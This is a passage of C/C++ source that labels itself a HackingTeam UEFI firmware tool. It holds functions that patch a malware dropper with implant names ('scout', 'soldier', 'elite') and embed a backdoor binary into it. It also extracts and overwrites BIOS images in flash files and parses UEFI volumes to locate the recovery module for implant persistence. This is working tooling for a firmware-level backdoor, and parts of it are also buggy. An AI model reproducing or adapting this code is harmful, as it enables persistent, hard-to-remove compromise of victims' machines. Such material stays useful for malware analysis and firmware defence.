		if (memcmp(&pFile->Name, &EndOfGuid, sizeof(EFI_GUID)) == 0)
			break;

		DWORD fsize = efi_ffs_file_size((PEFI_FFS_FILE_HEADER) pFile);

		pVolStat->FvFreeSpace -= fsize;


		// move to next zone
		if ((fsize % 8) == 0)
			pos += fsize;
		else
			pos += (fsize & 0xfffffff8) + 0x08;
	}

}

EFI_GUID gRecoveryModule = 
{
	0x3D17205B,
	0x4C49,
	0x47E2,
	{ 0x81, 0x57, 0x86, 0x4C, 0xD3, 0xD8, 0x0D, 0xBD }
};

const char *szElTorito = "EL TORITO";
const char *szCD001 = "CD001";
const char pRET[] = { 0xc3, 0x00 };

const char *szIFLASH_BIOSIMG = "$_IFLASH_BIOSIMG";

extern "C"
__declspec(dllexport) BOOL PatchDropper(LPCSTR lpDropperFile, LPCSTR lpBackdoorFile, LPCSTR lpScoutName, LPCSTR lpSoldierName, LPCSTR lpEliteName)
{
	printf("PatchDropper(%s,%s,%s,%s,%s)\n", lpDropperFile, lpBackdoorFile, lpScoutName, lpSoldierName, lpEliteName);

	wchar_t wszScoutName[32];
	wchar_t wszSoldierName[32];
	wchar_t wszEliteName[32];
	char szTag[32] = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x17, 0x18, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f};

	wchar_t g_NAME_SCOUT[] =   L"6To_60S7K_FU06yjEhjh5dpFw96549UU";
	wchar_t g_NAME_SOLDIER[] = L"kdfas7835jfwe09j29FKFLDOR3r35fJR";
	wchar_t g_NAME_ELITE[]   = L"eorpekf3904kLDKQO023iosdn93smMXK";

	memset(wszScoutName, 0, sizeof(wszScoutName));
	memset(wszSoldierName, 0, sizeof(wszSoldierName));
	memset(wszEliteName, 0, sizeof(wszEliteName));

	wsprintfW(wszScoutName, L"%S.exe", lpScoutName);
	wsprintfW(wszSoldierName, L"%S.exe", lpSoldierName);
	wsprintfW(wszEliteName, L"%S", lpEliteName);

	FILE *fd = fopen(lpDropperFile, "rb");

	fseek(fd, 0, SEEK_END);
	int size = ftell(fd) +4;

	void *buffer = malloc(size);
	fseek(fd, 0, SEEK_SET);
	fread(CALC_OFFSET(void *, buffer, 4), 1, size, fd);
	fclose(fd);

	// binary patch scout
	void *b = memmem(buffer, size, (void *) g_NAME_SCOUT, sizeof(g_NAME_SCOUT));
	if (b)
		memcpy(b, wszScoutName, sizeof(wszScoutName));

	// binary patch soldier
	b = memmem(buffer, size, (void *) g_NAME_SOLDIER, sizeof(g_NAME_SOLDIER));
	if (b)
		memcpy(b, wszSoldierName, sizeof(wszSoldierName));

	// binary patch elite
	b = memmem(buffer, size, (void *) g_NAME_ELITE, sizeof(g_NAME_ELITE));
	if (b)
		memcpy(b, wszEliteName, sizeof(wszScoutName));

	FILE *fback = fopen(lpBackdoorFile, "rb");

	fseek(fback, 0, SEEK_END);
	int fsize = ftell(fd);

	fseek(fback, 0, SEEK_SET);

	b = memmem(buffer, size, (void *) szTag, 32);

	LPDWORD dummy = (LPDWORD) buffer;

	// attribute section!
	*dummy = size;
	*dummy |= 0x10000000;

	dummy = (LPDWORD) b;

	*dummy = (DWORD) fsize;

	fread(CALC_OFFSET(void *, b, 4), 1, fsize, fback);
	fclose(fback);
	
	fd = fopen(lpDropperFile, "wb");

	fwrite(buffer, 1, size, fd);
	fclose(fd);

	free(buffer);

	return TRUE;

}

extern "C"
__declspec(dllexport) BOOL GetBiosImage(LPCSTR lpIsFlash, LPVOID FirmwareBlock, LPDWORD FirmwareSize)
{
	FILE *fd = fopen(lpIsFlash, "rb");

	//*FirmwareSize = 0;
	
	if (fd == NULL)
	{
		printf("\nCannot open %s", lpIsFlash);
		return FALSE;
	}

	fseek(fd, 0, SEEK_END);

	int size = ftell(fd);

	if (size == 0)
	{
		fclose(fd);
		return FALSE;
	}

	void *buffer = malloc(size);

	fseek(fd, 0, SEEK_SET);
	fread(buffer, 1, size, fd);
	fclose(fd);

	BOOL bRet = FALSE;

	void *tag = memmem(buffer, size, (void *) szIFLASH_BIOSIMG, strlen(szIFLASH_BIOSIMG));

	if (tag != NULL)
	{
		LPDWORD pFileSize = CALC_OFFSET(LPDWORD, tag, 0x10);

		if (*FirmwareSize == 0)
		{
			printf("\nExcept %d bytes in buffer!", *pFileSize);
			*FirmwareSize = *pFileSize;
			bRet = TRUE;
		}
		else if (*pFileSize != *FirmwareSize)
		{	// wrong buffer size
			printf("\nExcept %d bytes on behalf of %d!", *pFileSize, *FirmwareSize);
			bRet = FALSE;
		}
		else
		{	// buffer size 
			memcpy(FirmwareBlock, CALC_OFFSET(LPVOID, pFileSize, 8), *pFileSize);	// transfer block!
		}
	}

	free(buffer);
	return bRet;
}

extern "C"
__declspec(dllexport) BOOL SetBiosImage(LPCSTR lpIsFlash, LPCSTR lpFirmwareBlock, LPDWORD FirmwareSize)
{
	printf("SetBiosImage(%s, %s, %x)\n", lpIsFlash, lpFirmwareBlock, FirmwareSize);

	FILE *fd = fopen(lpIsFlash, "rb");

	//*FirmwareSize = 0;
	
	if (fd == NULL)
		return FALSE;

	fseek(fd, 0, SEEK_END);

	int size = ftell(fd);

	void *buffer = malloc(size);

	fseek(fd, 0, SEEK_SET);
	fread(buffer, 1, size, fd);
	fclose(fd);

	BOOL bRet = FALSE;

	void *tag = memmem(buffer, size, (void *) szIFLASH_BIOSIMG, strlen(szIFLASH_BIOSIMG));

	if (tag != NULL)
	{
		LPDWORD pFileSize = CALC_OFFSET(LPDWORD, tag, 0x10);

		FILE *newbios = fopen(lpFirmwareBlock, "rb");

		fseek(newbios, 0, SEEK_END);
		int newblock = ftell(newbios);
		fseek(newbios, 0, SEEK_SET);

		LPVOID FirmwareBlock = malloc(newblock);

		fread(FirmwareBlock, 1, newblock, newbios);
		fclose(newbios);
		memcpy(CALC_OFFSET(LPVOID, pFileSize, 8), FirmwareBlock, *pFileSize);	// transfer block!
		free(FirmwareBlock);
	}

	//free(buffer);

	fd = fopen(lpIsFlash, "wb");

	//*FirmwareSize = 0;
	
	if (fd == NULL)
		return FALSE;

	fwrite(buffer, 1, size, fd);
	fclose(fd);

	return bRet;
}

void dosname(LPCSTR lpStr)
{
	char *base = (char *) lpStr;
	char *parse = (char *) lpStr;

	while(*parse != 0x00)
	{
		if ((*parse >= '0' && *parse <= '9') ||
			(*parse == '.') ||
			(*parse >= 'a' && *parse <= 'z') ||
			(*parse >= 'A' && *parse <= 'Z'))
		{
			*base = *parse;
			base++;
		}

		*parse++;
	}

	*base = 0x00;

}

extern "C"
__declspec(dllexport) BOOL RecoveryInFD(LPCSTR lpFDVolume, LPCSTR lpUefiArch, LPCSTR lpUefiFileName)
{
	FILE *fd = fopen(lpFDVolume, "rb");

	if (fd == NULL)
		return FALSE;

	fseek(fd, 0, SEEK_END);
	int  size = ftell(fd);

	if (size <= 0)
	{
		printf("\tError! File empty!\n");
		fclose(fd);
		return -1;
	
	}
	void *buffer = malloc(size);
	memset(buffer, 0, size);

	if (buffer == NULL)
	{	//
		printf("\tError! malloc(%i) failed\n.", size);
		fclose(fd);
		return FALSE;
	}

	fseek(fd, 0, SEEK_SET);
	fread(buffer, 1, size, fd);
	fclose(fd);

	PEFI_FIRMWARE_VOLUME_HEADER pVolume = NULL;
	int sectionsize;

	do
	{
		pVolume = find_volume(pVolume, (char *) buffer, size);
		VOLUME_STAT stat;

		if (pVolume == NULL)
			printf("End of firmware.\n");
		else
		{
			printf("Found volume at %08x\n", ((char *) pVolume - (char *) buffer));
			volume_stat(pVolume, &stat);
			
			printf("\tFirmware Length: %08x\n", stat.FvLength);
			printf("\t     Free Space: %08x\n", stat.FvFreeSpace);


			PEFI_FFS_FILE_HEADER pRecoveryMod = volume_lookup_byguid(pVolume, &gRecoveryModule);

			if ( pRecoveryMod != NULL)
			{
				printf("\t *** FOUND RECOVERY on VOLUME ***\n");

				EFI_IMAGE_DOS_HEADER *header = (EFI_IMAGE_DOS_HEADER *) file_lookup_section(pRecoveryMod, EFI_SECTION_PE32, &sectionsize);
				EFI_IMAGE_PE_HEADER *peheader = CALC_OFFSET(EFI_IMAGE_PE_HEADER *, header, header->e_lfanew);
				EFI_IMAGE_FILE_HEADER *fheader = CALC_OFFSET(EFI_IMAGE_FILE_HEADER *, peheader, sizeof(EFI_IMAGE_PE_HEADER));

				//EFI_IMAGE_
				printf("\t *** Machine Type %04x\n", fheader->Machine);

				void *pPattern1 = memmem(header, sectionsize, (void *) szElTorito, strlen(szElTorito));
				void *pPattern2 = memmem(header, sectionsize, (void *) szCD001, strlen(szCD001));
				void *pFunction = memrmem(header, pPattern1, (void *) pRET, 1);

				if (pPattern1 == NULL)
				{
					printf("\t *** PATTERN ELTORITO not found! ***\n");
					return 0;
				}

				if (memcmp(CALC_OFFSET(void *, pPattern1, -8), szCD001, 5) == 0)
				{
					pPattern1 = CALC_OFFSET(void *, pPattern1, -9);
				}

				if (pPattern2 == NULL)
				{
					printf("\t *** PATTERN CD001 not found! ***\n");
				}

				if (fheader->Machine == 0x014c)
				{
					SetEnvironmentVariableA("UEFI_ARCH", "I386");
					strcpy((char *)lpUefiArch, "I386");
				}
				else if (fheader->Machine == 0x0200)
				{
					SetEnvironmentVariableA("UEFI_ARCH", "IA64");
					strcpy((char *)lpUefiArch, "IA64");
				}
				else if (fheader->Machine == 0x0EBC)
				{
					SetEnvironmentVariableA("UEFI_ARCH", "IPF");
					strcpy((char *)lpUefiArch, "IPF");
				}
				else if (fheader->Machine == 0x8664)
				{
					SetEnvironmentVariableA("UEFI_ARCH", "X64");
					strcpy((char *)lpUefiArch, "X64");
				}
				else
				{
					SetEnvironmentVariableA("UEFI_ARCH", "UNSUPPORTED");
					strcpy((char *)lpUefiArch, "UNSUPPORTED");
				}

				if (pFunction != NULL)
				{
					pFunction = CALC_OFFSET(void *, pFunction, 4);

					int size = ((int *) pPattern1 - (int *) pFunction);

					wchar_t *f = (wchar_t *) ((int) pFunction & 0xfffffffc);

					while(f < pPattern1)
					{
						if (*f != 0x00 && wcslen(f) > 1)
						{
							if (strlen((char *) f) > wcslen(f))
							{	// ascii?
								//SetEnvironmentVariableA("UEFI_RECOVERY_FILE", (char *) f);
								sprintf((char *) lpUefiFileName, "%s", f);
								dosname(lpUefiFileName);
								return 1;
							}
							else
							{
								printf("UEFI RECOVERY FILE %S", f);
								sprintf((char *) lpUefiFileName, "%S", f);
								dosname(lpUefiFileName);
								/*if (SetEnvironmentVariableW(L"UEFI_RECOVERY_FILE", f) == FALSE)
								{
									printf("\nGetLastError() %x", GetLastError());
								}*/
								return 1;
							}
						}

						f++;
					}

				}

				//printf("\t *** Looking for filenames...\n");

			}

			//volume_scan(argv[2], pVolume);
		}

	} while(pVolume != NULL);

	//find_lzma(buffer, size);
	free(buffer);

	return 0;

}

int main(int argc, char *argv[])
{
	printf("]HackingTeam[ - UEFI firmware tool\n");

	if (argc != 3)
	{
		printf("\tError! FD/BIN file and output folder required for analysis\n");
		return -1;
	}


	DWORD FirmwareSize = 0;

	//GetBiosImage(argv[1], NULL, reinterpret_cast<LPDWORD>(&FirmwareSize));

	DWORD nu = 0;
	SetBiosImage("z:\\vector-uefi\\z5we1x64.fd", "z:\\vector-uefi\\new.fd", (LPDWORD) &nu);

	PatchDropper("z:\\vector-uefi\\x64file2.tmp", "c:\\tools\\putty.exe", "scout.exe", "soldier.exe", "elite");


	FILE *fd = fopen(argv[1], "rb");

	fseek(fd, 0, SEEK_END);
	int  size = ftell(fd);
	
	if (size <= 0)
	{
		printf("\tError! File empty!\n");
		fclose(fd);
		return -1;
	
	}
	void *buffer = malloc(FirmwareSize);
	memset(buffer, 0, size);

	if (buffer == NULL)
	{	//
		printf("\tError! malloc(%i) failed\n.", size);
		fclose(fd);
		return -1;
	}

	fseek(fd, 0, SEEK_SET);
	fread(buffer, 1, size, fd);
	fclose(fd);

	PEFI_FIRMWARE_VOLUME_HEADER pVolume = NULL;
	int sectionsize;



	do
	{
		pVolume = find_volume(pVolume, (char *) buffer, size);
		VOLUME_STAT stat;

		if (pVolume == NULL)
			printf("End of firmware.\n");
		else
		{
			printf("Found volume at %08x\n", ((char *) pVolume - (char *) buffer));
			volume_stat(pVolume, &stat);
			
			printf("\tFirmware Length: %08x\n", stat.FvLength);
			printf("\t     Free Space: %08x\n", stat.FvFreeSpace);


			PEFI_FFS_FILE_HEADER pRecoveryMod = volume_lookup_byguid(pVolume, &gRecoveryModule);

			if ( pRecoveryMod != NULL)
			{
				printf("\t *** FOUND RECOVERY on VOLUME ***\n");

				EFI_IMAGE_DOS_HEADER *header = (EFI_IMAGE_DOS_HEADER *) file_lookup_section(pRecoveryMod, EFI_SECTION_PE32, &sectionsize);

				EFI_IMAGE_PE_HEADER *peheader = CALC_OFFSET(EFI_IMAGE_PE_HEADER *, header, header->e_lfanew);
				EFI_IMAGE_FILE_HEADER *fheader = CALC_OFFSET(EFI_IMAGE_FILE_HEADER *, peheader, sizeof(EFI_IMAGE_PE_HEADER));


				printf("\t *** Machine Type %04x\n", fheader->Machine);

				void *pPattern1 = memmem(header, sectionsize, (void *) szElTorito, strlen(szElTorito));
				void *pPattern2 = memmem(header, sectionsize, (void *) szCD001, strlen(szCD001));
				void *pFunction = memrmem(header, pPattern1, (void *) pRET, 1);

				if (pPattern1 == NULL)
				{
					printf("\t *** PATTERN ELTORITO not found! ***\n");
				}

				if (memcmp(CALC_OFFSET(void *, pPattern1, -8), szCD001, 5) == 0)
				{
					pPattern1 = CALC_OFFSET(void *, pPattern1, -9);
				}

				if (pPattern2 == NULL)
				{
					printf("\t *** PATTERN CD001 not found! ***\n");
				}

				printf("\t *** ALIGNMENT of EFI_IMAGE_HEADER.Machine %x", offsetof(EFI_IMAGE_FILE_HEADER, Machine));

				if (fheader->Machine == 0x014c)
					SetEnvironmentVariableA("UEFI_ARCH", "I386");
				else if (fheader->Machine == 0x0200)
					SetEnvironmentVariableA("UEFI_ARCH", "IA64");
				else if (fheader->Machine == 0x0EBC)
					SetEnvironmentVariableA("UEFI_ARCH", "IPF");
				else if (fheader->Machine == 0x8664)
					SetEnvironmentVariableA("UEFI_ARCH", "X64");

				if (pFunction != NULL)
				{
					pFunction = CALC_OFFSET(void *, pFunction, 4);

					int size = ((int *) pPattern1 - (int *) pFunction);

					wchar_t *f = (wchar_t *) ((int) pFunction & 0xfffffffc);

					while(f < pPattern1)
					{
						if (*f != 0x00 && wcslen(f) > 1)
						{
							if (strlen((char *) f) > wcslen(f))
							{	// ascii?
								SetEnvironmentVariableA("UEFI_RECOVERY_FILE", (char *) f);
								return 1;
							}
							else
							{
								if (SetEnvironmentVariableW(L"UEFI_RECOVERY_FILE", f) == FALSE)
								{
									printf("\nGetLastError() %x", GetLastError());
								}
								return 1;
							}
						}

						f++;
					}

				}

				printf("\t *** Looking for filenames...\n");

			}

			//volume_scan(argv[2], pVolume);
		}

	} while(pVolume != NULL);

	//find_lzma(buffer, size);
	free(buffer);

	return 0;
}